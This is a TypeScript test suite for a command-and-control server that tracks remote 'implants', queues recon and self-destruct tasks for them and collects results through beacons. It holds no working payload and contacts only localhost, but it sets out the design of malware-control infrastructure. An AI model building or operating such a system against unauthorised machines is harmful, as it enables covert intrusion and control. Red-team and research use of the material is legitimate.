import { describe, it, expect, afterEach } from "vitest";
import { createServer, type Server } from "node:http";
import express from "express";
import Database from "better-sqlite3";
import { ReachRegistry } from "./server/reach.js";
import { TaskQueue } from "./server/taskQueue.js";
import { createRouter } from "./server/api.js";
import type { ImplantHeartbeat, CreateTaskRequest, BeaconResponse, ReachSummary } from "./types.js";

// ---------------------------------------------------------------------------
// In-memory test server
// ---------------------------------------------------------------------------

interface TestApp {
  registry: ReachRegistry;
  taskQueue: TaskQueue;
  apiKey: string;
  implantToken: string;
  db: Database.Database;
  httpServer: Server;
  base: string;
}

function setupApp(): TestApp {
  const db = new Database(":memory:");
  db.pragma("journal_mode = WAL");
  db.pragma("foreign_keys = ON");

  db.exec(`
    CREATE TABLE IF NOT EXISTS implants (
      id TEXT PRIMARY KEY, name TEXT NOT NULL, target_host TEXT NOT NULL DEFAULT '',
      status TEXT NOT NULL DEFAULT 'active', first_seen TEXT NOT NULL, last_seen TEXT NOT NULL,
      version TEXT NOT NULL DEFAULT '1.0', profile TEXT, tags TEXT DEFAULT '[]',
      beacon_interval INTEGER NOT NULL DEFAULT 60000, stealth_config TEXT
    );
    CREATE TABLE IF NOT EXISTS tasks (
      task_id TEXT PRIMARY KEY, implant_id TEXT NOT NULL, type TEXT NOT NULL,
      params TEXT NOT NULL DEFAULT '{}', status TEXT NOT NULL DEFAULT 'pending',
      result TEXT, created_at TEXT NOT NULL, delivered_at TEXT, completed_at TEXT,
      operator_id TEXT NOT NULL DEFAULT '', priority INTEGER NOT NULL DEFAULT 1
    );
    CREATE INDEX IF NOT EXISTS idx_tasks_implant_status ON tasks(implant_id, status);
    CREATE INDEX IF NOT EXISTS idx_implants_status ON implants(status);
  `);

  const registry = new ReachRegistry(db);
  const taskQueue = new TaskQueue(db);
  const apiKey = "test-op-key";
  const implantToken = "test-imp-token";

  const app = express();
  app.use(express.json({ limit: "10mb" }));
  app.get("/api/v1/health", (_req, res) => res.json({ status: "ok" }));
  app.use(createRouter(registry, taskQueue, apiKey, implantToken));
  app.use((_req, res) => res.status(404).json({ error: "not found" }));

  const httpServer = createServer(app);
  httpServer.listen(0);
  const addr = httpServer.address() as { port: number };
  const base = `http://localhost:${addr.port}`;

  return { registry, taskQueue, apiKey, implantToken, db, httpServer, base };
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function beacon(
  app: TestApp,
  overrides: Partial<ImplantHeartbeat> = {},
): Promise<BeaconResponse> {
  const body: ImplantHeartbeat = {
    implantId: "test-implant-1",
    status: "active",
    uptime: 120,
    loadavg: [0.5, 0.3, 0.2],
    pendingResults: [],
    ...overrides,
  };
  const res = await fetch(`${app.base}/api/v1/beacon`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "x-implant-token": app.implantToken },
    body: JSON.stringify(body),
  });
  expect(res.ok).toBe(true);
  return res.json() as Promise<BeaconResponse>;
}

function opFetch(app: TestApp, path: string, init?: RequestInit) {
  return fetch(`${app.base}${path}`, {
    ...init,
    headers: {
      Authorization: `Bearer ${app.apiKey}`,
      "Content-Type": "application/json",
      ...init?.headers,
    },
  });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("C2 integration", () => {
  const apps: TestApp[] = [];

  afterEach(() => {
    for (const a of apps) {
      a.httpServer.close();
      a.db.close();
    }
    apps.length = 0;
  });

  it("health endpoint returns ok", async () => {
    const app = setupApp(); apps.push(app);
    const res = await fetch(`${app.base}/api/v1/health`);
    expect(res.ok).toBe(true);
    const body = await res.json();
    expect(body.status).toBe("ok");
  });

  it("full lifecycle: beacon → task → result", async () => {
    const app = setupApp(); apps.push(app);

    // 1. First beacon — auto-register
    const resp1 = await beacon(app, { implantId: "test-1" });
    expect(resp1.command).toBe("none");
    expect(resp1.tasks).toEqual([]);

    // 2. Reach shows 1 active
    const f1 = await (await opFetch(app, "/api/v1/operator/reach")).json() as ReachSummary;
    expect(f1.total).toBe(1);
    expect(f1.active).toBe(1);

    // 3. Create task
    const taskRes = await opFetch(app, "/api/v1/operator/task", {
      method: "POST",
      body: JSON.stringify({ implantId: "test-1", type: "recon_processes", params: {} }),
    });
    expect(taskRes.status).toBe(201);
    const task = await taskRes.json();

    // 4. Next beacon — receive task
    const resp2 = await beacon(app, { implantId: "test-1" });
    expect(resp2.tasks.length).toBe(1);
    expect(resp2.tasks[0].taskId).toBe(task.taskId);

    // 5. Submit result
    const resp3 = await beacon(app, {
      implantId: "test-1",
      pendingResults: [{
        taskId: task.taskId,
        sequenceNum: 1,
        success: true,
        data: "PID CMD\n1 init",
        startedAt: new Date().toISOString(),
        completedAt: new Date().toISOString(),
      }],
    });
    expect(resp3.ackedResults).toContain(task.taskId);

    // 6. Verify completed
    const taskList = await (await opFetch(app, `/api/v1/operator/tasks?implant=${encodeURIComponent("test-1")}`)).json() as Array<Record<string, unknown>>;
    const completed = taskList.find((t) => t.taskId === task.taskId);
    expect(completed).toBeDefined();
    expect(completed!.status).toBe("completed");
  });

  it("unknown implant returns 404 on task create", async () => {
    const app = setupApp(); apps.push(app);
    const res = await opFetch(app, "/api/v1/operator/task", {
      method: "POST",
      body: JSON.stringify({ implantId: "nonexistent", type: "recon_all", params: {} }),
    });
    expect(res.status).toBe(404);
  });

  it("self-destruct queued via kill endpoint", async () => {
    const app = setupApp(); apps.push(app);
    await beacon(app, { implantId: "kill-target" });

    const killRes = await opFetch(app, "/api/v1/operator/implant/kill-target/kill", {
      method: "POST",
    });
    expect(killRes.ok).toBe(true);
    const killBody = await killRes.json();
    expect(killBody.taskId).toBeDefined();
    expect(killBody.message).toContain("self-destruct");

    // Verify task created
    const taskList = await (await opFetch(app, `/api/v1/operator/tasks?implant=${encodeURIComponent("kill-target")}`)).json() as Array<Record<string, unknown>>;
    const sd = taskList.find((t) => t.type === "self_destruct");
    expect(sd).toBeDefined();
    expect(sd!.priority).toBe(99);
  });

  it("auth rejects requests without valid token", async () => {
    const app = setupApp(); apps.push(app);

    const res1 = await fetch(`${app.base}/api/v1/operator/reach`);
    expect(res1.status).toBe(401);

    const res2 = await fetch(`${app.base}/api/v1/operator/reach`, {
      headers: { Authorization: "Bearer wrong-key" },
    });
    expect([401, 403]).toContain(res2.status);
  });
});
